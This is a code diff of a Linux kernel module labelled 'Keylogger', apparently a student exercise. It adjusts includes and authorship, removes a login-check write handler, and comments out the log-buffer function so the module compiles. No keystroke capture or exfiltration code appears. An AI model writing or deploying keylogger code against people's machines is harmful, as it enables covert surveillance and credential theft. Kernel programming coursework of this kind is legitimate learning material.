@@ -8,19 +8,20 @@
 #include <linux/miscdevice.h>
 #include <linux/uaccess.h>
 #include <linux/errno.h>
-#include <string.h>
+#include <linux/string.h>
+#include <linux/vmalloc.h>
 
-MODULE_AUTHOR("sel-melc");
+MODULE_AUTHOR("hsmits & sel-melc");
 MODULE_DESCRIPTION("Keylogger");
 MODULE_LICENSE("GPL");
 
-#define INTRA_LOGIN "sel-melc"
 
 char *log_buffer = NULL;
 
 /*
 *  Adds a new entry to the log_buffer.
 */
+/*
 static int add_new_entry(char *entry)
 {
 	char *tmp_buff;
@@ -38,7 +39,7 @@ static int add_new_entry(char *entry)
 	log_buffer = tmp_buff;
 	return (0);
 }
-
+*///Commented for now so compilation works
 static ssize_t handle_read(struct file *file, char __user *to, size_t size, loff_t *_offset)
 {
 	if (!log_buffer)
@@ -46,24 +47,9 @@ static ssize_t handle_read(struct file *file, char __user *to, size_t size, loff
 	return simple_read_from_buffer(to, size, _offset, log_buffer, strlen(log_buffer));
 }
 
-static ssize_t handle_write(struct file *file, const char __user *from, size_t size, loff_t *_offset)
-{
-	static char buf[sizeof(INTRA_LOGIN)];
-	ssize_t ret;
-
-	if (size != sizeof(INTRA_LOGIN) - 1)
-		return -EINVAL;
-	ret = copy_from_user(buf, from, sizeof(INTRA_LOGIN) - 1);
-
-	if (ret || memcmp(buf, INTRA_LOGIN, sizeof(INTRA_LOGIN) - 1))
-		return -EINVAL;
-
-	return sizeof(INTRA_LOGIN) - 1;
-}
 
 static struct file_operations fops = {
 	.read = &handle_read,
-	.write = &handle_write,
 };
 
 static struct miscdevice misc_dev = {
